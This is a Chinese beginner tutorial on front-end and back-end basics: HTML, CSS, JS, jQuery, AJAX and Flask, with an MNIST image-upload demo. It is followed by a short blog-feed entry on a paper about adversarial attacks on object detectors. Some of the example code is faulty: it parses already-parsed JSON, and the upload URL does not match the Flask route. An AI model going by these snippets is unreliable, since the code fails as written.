一片区域中对外使用统一的一个公网IP就可以了。 IP和域名有什么区别？ IP是由数字组成的，域名可以映射到IP。域名相当于IP的小名，方便记忆用的。 Web开发中的路由有什么作用？ 根据url分配到对应的处理程序，你可以用函数封装的思想去理解他。你想要什么样的数据就像对应的路由请求数据。 数据包是干什么的？ 数据包中包含了所需的数据，GET和POST请求都在发送数据包？请求的数据和响应的数据都在数据包当中。 常见的请求方式有哪几种？分别用于什么场合？ 常见的请求方式有GET和POST两种，GET一般用于前端像后端请求数据时使用。POST一般用于前端像后端传递数据使用。 ¶留给你们的一些坑 有兴趣的自己了解了解； 什么是MAC地址？ 有了MAC地址，为什么还需要IP地址呢？ 如果一片区域的设备对外的IP都是同一个公有IP，那么当一个数据包过来的时候如何知道应该把这个数据包发送给区域中的哪一个设备呢？ ¶前端三剑客基础知识 前端主要由三部分组成：即HTML+CSS+JS； HTML主要负责前端的基本框架，CSS主要负责调整网页的外观，JS负责处理页面的逻辑。 比如上面这个页面，“四大部分”，这四个字他的存在是由HTML决定的。但是你可以看到四大部门是居中的。这个居中的属性就是由CSS负责调整的。当然了也可以通过&lt;center&gt;&lt;/center&gt;标签去实现这个效果 ¶HTML基础知识 推荐学习网站：https://www.runoob.com/html/html-tutorial.html ¶什么是HTML HTML 是用来描述网页的一种语言。 HTML 指的是超文本标记语言: HyperText Markup Language HTML 不是一种编程语言，而是一种标记语言（MarkDown也是一种标记语言,可以进行类比学习） 标记语言是一套标记标签 (markup tag) HTML 使用标记标签来描述网页 HTML 文档包含了HTML 标签及文本内容 HTML文档也叫做 web 页面 ¶HTML网页结构 下面是一个可视化的HTML页面结构： 只有&lt;body&gt; \b区域 (\b白色部分) \b才会在浏览器中显示。 ¶创建一个简单的HTML文件 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;科协NB&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;xjl 永远的神&lt;/h1&gt; &lt;p&gt;宫老师，什么时候教教我？&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; ¶HTML元素语法 HTML 元素以开始标签起始 HTML 元素以结束标签终止 元素的内容是开始标签与结束标签之间的内容 某些 HTML 元素具有空内容（empty content） 空元素在开始标签中进行关闭（以开始标签的结束而结束） 大多数 HTML 元素可拥有属性 ¶嵌套的 HTML 元素 大多数 HTML 元素可以嵌套（HTML 元素可以包含其他 HTML 元素）。 HTML 文档由相互嵌套的 HTML 元素构成。 HTML嵌套的特性让我们在使用CSS的时候可以对一块的元素进行调整。 ¶HTML属性 HTML 元素可以设置属性 属性可以在元素中添加附加信息 属性一般描述于开始标签 属性总是以名称/值对的形式出现，比如：name=“value”。 ¶一些常用的HTML元素 这些元素都不需要背，看到能够认出来就行，忘记了就去Baidu一下。 123456789101112131415161718&lt;!-- 一级标题 --&gt;&lt;h1&gt;这是一个标题。&lt;/h1&gt; &lt;!-- 二级标题 --&gt;&lt;h2&gt;这是一个标题。&lt;/h2&gt; &lt;!-- 三级标题 --&gt;&lt;h3&gt;这是一个标题。&lt;/h3&gt; &lt;!-- 段落 --&gt;&lt;p&gt;这是一个段落 &lt;/p&gt;&lt;p&gt;这是另一个段落&lt;/p&gt;&lt;!-- 加粗字体 --&gt;&lt;b&gt;这是一个加粗文本&lt;/b&gt;&lt;!-- 超链接 --&gt;&lt;a href=&quot;https://www.baidu.com/&quot;&gt;访问Baidu&lt;/a&gt;&lt;!-- 图像 --&gt;&lt;img src=&quot;https://blog.keter.top/img/touxiang.png&quot; alt=&quot;一张神奇的图像&quot;&gt;&lt;!-- 输入框 --&gt;&lt;input type=&quot;text&quot;&gt;&lt;input type=&quot;password&quot;&gt; 其他的元素可以参考：HTML 速查列表 ¶小练习 图片大小固定width: 300px height: 300px 使用html搭建一个这样的结构： ¶CSS基础语法 推荐学习网站：https://www.runoob.com/css/css-tutorial.html ¶什么是CSS? CSS 指层叠样式表 (Cascading Style Sheets) 样式定义如何显示 HTML 元素 样式通常存储在样式表中 外部样式表可以极大提高工作效率 外部样式表通常存储在 CSS 文件中 ¶CSS创建 ¶插入样式表的三种方法 内联样式 由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。 要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距。 1&lt;h1 style=&quot;color: brown;&quot;&gt;xjl 永远的神&lt;/h1&gt; 内部样式表 当单个文档需要特殊的样式时，就应该使用内部样式表。你可以使用 &lt;style&gt; 标签在文档头部定义内部样式表，就像这样: 123456&lt;head&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; a &#123;color:yellow;&#125; &lt;/style&gt;&lt;/head&gt; 外部样式表 当样式需要应用于很多页面时，外部样式表将是理想的选择。在使用外部样式表的情况下，你可以通过改变一个文件来改变整个站点的外观。每个页面使用&lt;link&gt; 标签链接到样式表。 &lt;link&gt; 标签在（文档的）头部： 123&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt;&lt;/head&gt; ¶CSS语法 CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明: 选择器通常是需要改变样式的 HTML 元素。 每条声明由一个属性和一个值组成。 属性（property）是希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。 ¶CSS的Id和Class选择器 ¶Id选择器 id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。 HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。 例子： 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; #first &#123;text-align: center;&#125; #second &#123;color: red;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;first&quot;&gt; 第一个 &lt;/p&gt; &lt;p id=&quot;second&quot;&gt; 第二个 &lt;/p&gt; &lt;p id=&quot;third&quot;&gt; 第三个 &lt;/p&gt;&lt;/body&gt;&lt;/html&gt; ¶Class选择器 class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。 class 选择器在HTML中以class属性表示, 在 CSS 中，类选择器以一个点&quot;.&quot;号显示： 在以下的例子中，所有拥有 center 类的 HTML 元素均为居中。 例子： 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; #first &#123;text-align: center;&#125; #second &#123;color: red;&#125; .center &#123;text-align: center;&#125; h3.center &#123;color: red;&#125; &lt;/style&gt;&lt;/head&gt; &lt;body&gt; &lt;p id=&quot;first&quot;&gt; 第一个 &lt;/p&gt; &lt;p id=&quot;second&quot;&gt; 第二个 &lt;/p&gt; &lt;p id=&quot;third&quot;&gt; 第三个 &lt;/p&gt; &lt;p class=&quot;center&quot;&gt; 第三个 &lt;/p&gt; &lt;p class=&quot;center&quot;&gt; 第三个 &lt;/p&gt; &lt;p class=&quot;center&quot;&gt; 第三个 &lt;/p&gt; &lt;h3 class=&quot;center&quot;&gt; 第三个&lt;/h3&gt; &lt;h3 class=&quot;center&quot;&gt; 第三个&lt;/h3&gt; &lt;h3 class=&quot;center&quot;&gt; 第三个&lt;/h3&gt; &lt;h3 class=&quot;center&quot;&gt; 第三个&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; ¶CSS具体语法 至于： 如何调整字体大小？ 如何调整字体颜色？ 如何设置元素浮动？ 如何设置图片的不透明度？ 请参照：菜鸟教程 本次培训的目的不是把你们培训成网页开发者，只是让你们熟悉一下网页的结构将来可以和算法对接。 ¶小例子 ¶JS基础知识 推荐学习网址：https://www.runoob.com/js/js-tutorial.html ¶什么是JS JS全称JavaScript： JavaScript 是一种轻量级的编程语言。 JavaScript 是可插入 HTML 页面的编程代码。 JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行。 ¶JS的用法 HTML 中的脚本必须位于 &lt;script&gt; 与 &lt;/script&gt; 标签之间。 脚本可被放置在 HTML 页面的 &lt;body&gt; 和&lt;head&gt; 部分中。 ¶&lt;script&gt; 标签 如需在 HTML 页面中插入 JavaScript，请使用 &lt;script&gt; 标签。 &lt;script&gt; 和 &lt;/script&gt; 会告诉 JavaScript 在何处开始和结束。 比如： 123&lt;script&gt;alert(&quot;我的第一个 JavaScript&quot;);&lt;/script&gt; 你们暂时无需理解上面的代码。只需明白，浏览器会解释并执行位于 &lt;script&gt; 和 &lt;/script&gt;之间的 JavaScript 代码 。 ¶写JS代码的三个位置 写在head当中 写在body当中 写在外置文件当中 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;!-- 写在外置文件当中 --&gt; &lt;script src=&quot;myScript.js&quot;&gt;&lt;/script&gt; &lt;title&gt;Document&lt;/title&gt; &lt;!-- 写在head中 --&gt; &lt;script&gt; document.write(&quot;&lt;h1&gt;223333&lt;/h1&gt;&quot;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 写在body中 --&gt;1 &lt;script&gt; document.write(&quot;&lt;h1&gt;1111&lt;/h1&gt;&quot;); alert(&quot;666，我的宝贝&quot;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 写在body和写在head中的代码其实没有什么特殊的区别，需要注意的就是head中的JS代码是先被执行的，body中的代码是后被执行的。有时候JS代码是需要和HTML元素绑定的，JS代码一定要写在绑定元素的下面（x）。 ¶JS语法 JS变量： 在JS中如果你要声明一个变量可以使用：var x = 1; JS中的数据类型： 12345var length = 16; // Number 通过数字字面量赋值 var points = x * 10; // Number 通过表达式字面量赋值 var lastName = &quot;Johnson&quot;; // String 通过字符串字面量赋值 var cars = [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;]; // Array 通过数组字面量赋值 var person = &#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;&#125;; // Object 通过对象字面量赋值 JS函数： JavaScript 语句可以写在函数内，函数可以重复引用： 123function myFunction(a, b) &#123; return a * b; // 返回 a 乘以 b 的结果&#125; 还有JS中的for循环啊，while循环啊之类的就不多说了和C语言的用法基本一致。 ¶如何使用HTML元素触发函数 我们知道函数在没有调用的时候说不会执行的，我们编写JS函数的目的是希望在用户操作页面的时候可以有对应的响应。下面我们就介绍一下HTML元素绑定函数的几种方法： onclick() 比如下面这个代码： 12345678&lt;body&gt; &lt;button onclick=&quot;myFunction()&quot;&gt;点我啊&lt;/button&gt; &lt;script&gt; function myFunction()&#123; alert(&quot;aaaa&quot;); &#125;; &lt;/script&gt;&lt;/body&gt; 这个代码就是将button绑定了myFunction()这个函数。 使用普通的JS代码绑定 123456789101112&lt;body&gt; &lt;button id=&quot;b1&quot;&gt;点我啊&lt;/button&gt; &lt;script&gt; function myFunction()&#123; alert(&quot;aaaa&quot;); &#125;; var bt = document.getElementById(&#x27;b1&#x27;); bt.onclick = function()&#123; myFunction(); &#125; &lt;/script&gt;&lt;/body&gt; 首先我们需要获取到按钮这个对象，使用document.getElementById可以获取。接着定义这个对象的onclick对应的事件。 使用JQuery库绑定 JQuery是JS的一个库提供了一些比较好用的接口，具体的介绍这里就不说了直接说他要怎么用。还是那句话这篇教程不是为了培养一个高端的前端工程师的，我直接也不是专业的说的地方也有可能是错的。只是想让大家看过之后可以对前后端有个了解，能够看懂别人的代码或者在别人代码的基础上做一定的修改。 引入JQuery库： 一般引入的代码写在head的位置 &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; 绑定的方式如下： 123456789&lt;body&gt; &lt;button id=&quot;b1&quot;&gt;点我啊&lt;/button&gt; &lt;script&gt; $(&quot;#b1&quot;).on(&quot;click&quot;,myFunction); function myFunction()&#123; alert(&quot;aaaa&quot;); &#125;; &lt;/script&gt;&lt;/body&gt; 除了点击，jq也可以便捷的实现鼠标移动到上面就触发的效果。把上述的代码改成mouseover即可； ¶JQ的一些基本操作 ¶基本语法格式 $(selector).action() 选择符（selector）查询HTML 元素：this、标签名称、.类名、#id jQuery 的 action() 执行对元素的操作 ¶JQ的选择器 它完全继承了 CSS 的风格,可以对元素的标签名、属性名、状态等进行快速准确的选择,并且不必担心浏览器的兼容性,写法更加简洁。 基本选择器 选择题 描述 示例 #id 根据指定的ID匹配元素 $(’#box’)选择id为box的标签 .class 根据给定的类名匹配元素 $(’.left’)选择class为left的标签 Element 根据给定的元素名匹配元素 $(‘p’)选择所有段落标签 * 匹配所有元素 $(’*’)选择所有不分类型标签 Seletor1,Seletor2 将每一个选择器匹配到的元素合并到一起返回 $(‘p,h1’)同时选择段落和标题一 层级选择器 选择题 描述 $(‘ul li’) 选择ul当中所有li（所有后代元素） $(‘ul&gt;li’) 选择ul当中子元素li所有的子元素 $(‘p+div’) 选择段落后的第一个div 等等… 主要要用到的就是基本选择器了。 ¶JQ操作html元素 获得内容 text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值 设置内容 text(参数) - 设置或返回所选元素的文本内容 html(参数) - 设置或返回所选元素的内容（包括 HTML 标记） val(参数) - 设置或返回表单字段的值 回调函数： 回调函数由两个参数：被选元素列表中当前元素的下标，以及原始（旧的）值。然后以函数新值返回； 示例： 123text(function(i,origText)&#123; return &quot;Old text: &quot; + origText + &quot; New text: Hello world!&#125; ¶ajax 建议学习网址：https://www.runoob.com/jquery/ajax-ajax.html ¶什么是AJAX AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。 AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容。 AJAX 不需要任何浏览器插件，但需要用户允许JavaScript在浏览器上执行。 ¶JQ与Ajax jQuery 提供多个与 AJAX 有关的方法。 通过 jQuery AJAX 方法，能够使用 HTTP Get 和 HTTP Post 从远程服务器上请求文本、HTML、XML 或 JSON - 同时能够把这些外部数据直接载入网页的被选元素中。 ¶GET方法 使用JQ实现GET方法： 例子： 请求 “/hello”，但是忽略返回结果： 1$.get(&quot;/hello&quot;); 请求 “test.php” 并连同请求发送一些额外的数据（忽略返回结果）： 1$.get(&quot;/hello&quot;, &#123; name:&quot;Donald&quot;, town:&quot;Ducktown&quot; &#125;); 请求 “test.php” 并传递数据数组到服务器（忽略返回结果）： 1$.get(&quot;/hello&quot;, &#123; &#x27;colors[]&#x27; : [&quot;Red&quot;,&quot;Green&quot;,&quot;Blue&quot;] &#125;); 请求 “test.php” 并提醒请求的结果： 123$.get(&quot;/hello&quot;, function(data)&#123;alert(&quot;Data: &quot; + data);&#125;); 语法 1$.get(URL,data,function(data,status,xhr),dataType) json数据类型： Json数据是一种特殊格式的字符串。可以被编程语言解析。其格式就是Python的字典，如果使用Python作为后端那么如果从前端接收到了Json类型的字符串就可以使用相关库将数据直接解析为字典类型。 12345import jsona = &#123;&quot;a&quot;: 1&#125;print(json.dumps(a)) # &#123;&quot;a&quot;: 1&#125; print(type(json.dumps(a))) # &lt;class &#x27;str&#x27;&gt; ¶POST方法 Ajax通过&lt;img src=&quot;https://www.zhihu.com/equation?tex=.post()方法也可以发送post数据，但是默认不是json类型，所以我们使用&quot; alt=&quot;&quot; style=&quot;margin: 0 auto;&quot; class=&quot;ee_img tr_noresize&quot; eeimg=&quot;1&quot;&gt;.ajax方法来发送json数据 $.ajax() 方法通过 HTTP POST 请求向服务器提交数据。 语法： 1$.ajax(&#123;name:value, name:value, ... &#125;) 参数列表： 使用POST发送json数据的例子： 12345678910111213$(&quot;#b1&quot;).click(function () &#123; var data = &#123;&quot;a&quot;: 1,&quot;b&quot;: 2&#125; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;/post_test&quot;, contentType: &quot;application/json; charset=utf-8&quot;, data: JSON.stringify(data), dataType: &quot;json&quot;, success: function (data) &#123; console.log(&quot;发送成功&quot;) &#125;, &#125;); &#125;) ¶后端Flask基础知识 推荐学习网站：https://read.helloflask.com Flask是一个使用Python编写的轻量级Web应用框架。 安装：pip3 install flask ¶最基础的Flask程序 下面是Flask的一个最基础的程序，允许这个这个程序Flask会在你电脑的5000端口启动一个后端服务。你可以通过http://127.0.0.1:5000去访问这个服务。 12345678910111213import flaskfrom flask import Flaskfrom flask import render_templateapp = Flask(__name__)# 定义总路由@app.route(&#x27;/&#x27;)def index(): return &quot;Hello Flask&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) ¶加载静态网页 一般的在根路由下我们会返回一下静态的网页，只需要稍微进行修改几个。首先我们需要一个静态网页命名为index.html。 代码结构如下： 123├── demo.py├── templates│ └── index.html 你需要把静态的html文件放在templates文件夹中，当然这个文件夹的路径也可以自定义，默认就是templates。 Index.html的代码如下： 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello Flask!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 接下来我们在Flask中设置访问根路由时返回该静态模版（只需要一句render_template('index.html')） 12345678910111213import flaskfrom flask import Flaskfrom flask import render_templateapp = Flask(__name__)# 定义总路由@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;index.html&#x27;)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 接下来重新运行一遍后端代码，之后打开:http://127.0.0.1:5000，你就可以看到： ¶前后端相互通信 ¶接收GET类型的数据 GET传参的方式：http://127.0.0.1:5000/hello?a=1&amp;b=2 在发送get请求的时候在路由的后面进行传参数 Flask接收GET参数： 1234567891011from flask import request@app.route(&#x27;/get_test&#x27;, methods=[&#x27;GET&#x27;])def get_test(): a = request.args.get(&quot;a&quot;) b = request.args.get(&#x27;b&#x27;) c = request.args.get(&#x27;c&#x27;) print(a,end=&#x27;&#x27;) print(b,end=&#x27;&#x27;) print(c,end=&#x27;&#x27;) return &quot;请求成功&quot; 比如我们现在请求http://127.0.0.1:5000/get_test?a=1&amp;b=2&amp;c=3在后端控制台中就会输出：123 如果没有这个参数就会返回一个None； ¶接受POST类型的数据 首先我们编写一个简单的html页面： 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button id=&quot;b1&quot;&gt;点我啊&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 接着在后端定义一个新的子页面 123@app.route(&#x27;/post&#x27;)def post(): return render_template(&#x27;post_test.html&#x27;) 接下来定义一下post_test路由的行为逻辑： 123456789@app.route(&#x27;/post_test&#x27;, methods=[&#x27;POST&#x27;])def post_test(): # 获取json数据 data = request.get_json() # 解析json数据 data = json.loads(data) print(data[&#x27;a&#x27;]) print(data[&#x27;b&#x27;]) return json.dumps(data) 最后编写前端的JS逻辑： 1234567891011121314151617181920&lt;script&gt; // 使用ajax发送post请求 $(&quot;#b1&quot;).click(function () &#123; var data = &#123; a: 1, b: 2, &#125; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;/post_test&quot;, contentType: &quot;application/json; charset=utf-8&quot;, data: JSON.stringify(data), dataType: &quot;json&quot;, success: function (data) &#123; var d = data; console.log(d); &#125;, &#125;); &#125;)&lt;/script&gt; ¶例子 现在我们来做一个例子，我们首先在后端写好一个手写数字识别的程序。通过前端上传一张图片，后端进行识别然后将识别结果显示在屏幕上。 ¶训练一个可以识别数字的模型 训练代码见附录，代码很简单，下面我们写一个识别的接口： 123456789101112131415161718192021222324252627import torchfrom PIL import Imagefrom detector import Netfrom torchvision.transforms import functionalimport numpy as np@torch.no_grad()def detect(img_path, model_path=&#x27;./model.pth&#x27;): # 读取图片 img = Image.open(img_path) img = img.convert(&#x27;L&#x27;) img = img.resize((28, 28)) img = functional.pil_to_tensor(img) / 255. img = img.unsqueeze(0) # 加载模型 model = Net() model.load_state_dict(torch.load(model_path)) model.eval() result = model(img)[0] result = np.argmax(result.tolist()) return resultif __name__ == &#x27;__main__&#x27;: detect(img_path=&#x27;/Users/keter/Downloads/5.jpg&#x27;) 这个接口可以帮助我们识别上传的图片 ¶前端使用ajax上传代码 前端使用ajax上传图片的代码非常的简单，首先我们需要一个可以选择图像的按钮和一个上传的按钮。上传的按钮绑定一下上传的相关逻辑。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;首页&lt;/title&gt; &lt;style&gt; #img &#123; width: 300px; height: 300px &#125; #box &#123; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;box&quot;&gt; &lt;h2&gt;Mnist手写数字识别&lt;/h2&gt; &lt;!--初始化一个img标签--&gt; &lt;img id=&quot;img&quot; src=&quot;&quot;&gt; &lt;form id=&quot;uploadForm&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;上传&quot; id=&quot;upFileBtn&quot;&gt; &lt;/form&gt; &lt;!-- 显示识别结果 --&gt; &lt;p id=&quot;p1&quot;&gt;识别结果：&lt;nobr id=&quot;d1&quot;&gt; &lt;nobr/&gt; &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;https://cdn.staticfile.org/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; // 绑定上传按钮 $(&#x27;#upFileBtn&#x27;).click(function () &#123; var formFile = new FormData($(&#x27;#uploadForm&#x27;)[0]) $.ajax(&#123; url: &quot;/upload&quot;, // 选择给定路由 type: &quot;POST&quot;, // 选择上传方式 data: formFile, // 使用form表单的形式上传 processData: false, contentType: false, success: function (data) &#123; var d = JSON.parse(data) // 解析JSON数据 $(&#x27;#img&#x27;).attr(&#x27;src&#x27;, d.file_url); // 更新显示的图片 $(&#x27;#d1&#x27;).html(d.detect_result) // 更新识别的结果 &#125; &#125;) &#125;)&lt;/script&gt;&lt;/html&gt; ¶后端接受图片的代码 后端我们需要使用flask_uploads，pip3 install flask_uploads 首先我们需要导入相关的包，然后设置一下相关的配置： 12345678from flask_uploads import UploadSet, IMAGES, configure_uploads, patch_request_classapp = Flask(__name__)app.config[&quot;UPLOADED_PHOTOS_DEST&quot;] = &#x27;uploads&#x27;photo = UploadSet(&#x27;photos&#x27;, IMAGES)configure_uploads(app, photo)patch_request_class(app) 接下来写一下接受的相关逻辑 123456789@app.route(&#x27;/detector&#x27;, methods=[&#x27;POST&#x27;])def detector(): filename = photo.save(request.files[&#x27;file&#x27;]) #保存图片 file_url = photo.url(filename) # 获取url path = photo.path(filename) # 获取存储路径 result = detect(path) data = &#123;&#x27;file_url&#x27;: file_url, &quot;detect_result&quot;: str(result)&#125; # 构造返回数据 data = json.dumps(data) # 转换为字符串 return data ¶实现效果 ¶可能会遇到的BUG 1.“ImportError: cannot import name’secure_filename’ from’werkzeug’” when importing the flask_uploads package 解决网址： https://www.programmersought.com/article/88615197452/ ¶多多实践 ¶附录代码 ¶Pytorch训练Mnist （ 我随便从网上拷贝的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103import torchimport torch.nn as nnfrom torch.utils.data import dataloaderimport torchvisionimport torch.nn.functional as Fimport torch.optim as optimn_epochs = 3batch_size_train = 64batch_size_test = 1000learning_rate = 0.01momentum = 0.5log_interval = 10random_seed = 1torch.manual_seed(random_seed)train_loader = torch.utils.data.DataLoader( torchvision.datasets.MNIST(&#x27;./data/&#x27;, train=True, download=True, transform=torchvision.transforms.Compose([ torchvision.transforms.ToTensor(), torchvision.transforms.Normalize( (0.1307,), (0.3081,)) ])), batch_size=batch_size_train, shuffle=True)test_loader = torch.utils.data.DataLoader( torchvision.datasets.MNIST(&#x27;./data/&#x27;, train=False, download=True, transform=torchvision.transforms.Compose([ torchvision.transforms.ToTensor(), torchvision.transforms.Normalize( (0.1307,), (0.3081,)) ])), batch_size=batch_size_test, shuffle=True)class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv1 = nn.Conv2d(1, 10, kernel_size=5) self.conv2 = nn.Conv2d(10, 20, kernel_size=5) self.conv2_drop = nn.Dropout2d() self.fc1 = nn.Linear(320, 50) self.fc2 = nn.Linear(50, 10) def forward(self, x): x = F.relu(F.max_pool2d(self.conv1(x), 2)) x = F.relu(F.max_pool2d(self.conv2_drop(self.conv2(x)), 2)) x = x.view(-1, 320) x = F.relu(self.fc1(x)) x = F.dropout(x, training=self.training) x = self.fc2(x) return F.log_softmax(x)network = Net()optimizer = optim.SGD(network.parameters(), lr=learning_rate, momentum=momentum)train_losses = []train_counter = []test_losses = []test_counter = [i * len(train_loader.dataset) for i in range(n_epochs + 1)]def train(epoch): network.train() for batch_idx, (data, target) in enumerate(train_loader): optimizer.zero_grad() output = network(data) loss = F.nll_loss(output, target) loss.backward() optimizer.step() if batch_idx % log_interval == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) train_losses.append(loss.item()) train_counter.append( (batch_idx * 64) + ((epoch - 1) * len(train_loader.dataset))) torch.save(network.state_dict(), &#x27;./model.pth&#x27;) torch.save(optimizer.state_dict(), &#x27;./optimizer.pth&#x27;)def _test(): network.eval() test_loss = 0 correct = 0 with torch.no_grad(): for data, target in test_loader: output = network(data) test_loss += F.nll_loss(output, target, size_average=False).item() pred = output.data.max(1, keepdim=True)[1] correct += pred.eq(target.data.view_as(pred)).sum() test_loss /= len(test_loader.dataset) test_losses.append(test_loss) print(&#x27;\\nTest set: Avg. loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)\\n&#x27;.format( test_loss, correct, len(test_loader.dataset), 100. * correct / len(test_loader.dataset)))for epoch in range(1, n_epochs + 1): train(epoch) _test()","categories":[],"tags":[{"name":"前后端","slug":"前后端","permalink":"http://blog.keter.top/tags/%E5%89%8D%E5%90%8E%E7%AB%AF/"}]},{"title":"「论文阅读」Real-World-Adversarial-attack","slug":"【论文阅读】Real-World-Adversarial-attack","date":"2021-06-30T06:01:02.000Z","updated":"2021-08-13T13:40:05.000Z","comments":true,"path":"2021/06/30/【论文阅读】Real-World-Adversarial-attack/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Real-World-Adversarial-attack/","excerpt":"¶Making an Invisibility Cloak: Real World Adversarial Attacks on Object Detectors propose a new loss function to produce patch;Print the patch on the cloth. People who wear this cloth can not be detected by object detectors in the real world Paper url: https://arxiv.org/abs/1810.05206","text":"¶Making an Invisibility Cloak: Real World Adversarial Attacks on Object Detectors propose a new loss function to produce patch;Print the patch on the cloth. People who wear this cloth can not be detected by object detectors in the real world Paper url: https://arxiv.org/abs/1810.05206","categories":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/categories/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}],"tags":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}]},{"title":"「算法」第十届蓝桥杯B-组国赛真题","slug":"【算法】第十届蓝桥杯B-组国赛真题","date":"2021-05-30T06:01:02.000Z","updated":"2021-08-17T09:03:30.000Z","comments":true,"path":"2021/05/30/【算法】第十届蓝桥杯B-组国赛真题/","link":"","permalink":"http://blog.keter.top/2021/05/30/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E7%AC%AC%E5%8D%81%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFB-%E7%BB%84%E5%9B%BD%E8%B5%9B%E7%9C%9F%E9%A2%98/","excer